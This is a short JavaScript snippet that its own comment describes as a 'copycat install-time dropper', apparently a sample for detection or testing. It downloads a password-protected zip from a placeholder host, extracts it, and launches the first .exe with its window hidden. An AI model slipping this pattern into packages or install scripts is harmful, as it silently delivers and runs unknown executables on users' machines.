// Copycat install-time dropper with renamed helpers and no hosted URL.
// It downloads an archive, extracts it with a password, and launches the
// first extracted executable with its window hidden.
const { spawn } = require('child_process');
const Seven = require('node-7z');

async function installHelper(source, zipPath, outDir, pw) {
  await downloadFile(source, zipPath);
  Seven.extractFull(zipPath, outDir, { password: pw });
  const files = listFiles(outDir);
  const exeFiles = files.filter(f => f.endsWith('.exe'));
  const exePath = exeFiles[0];
  spawn(exePath, [], { windowsHide: true });
}

installHelper('https://downloads.example.test/tool.zip', 'tool.zip', 'out', 'pw');
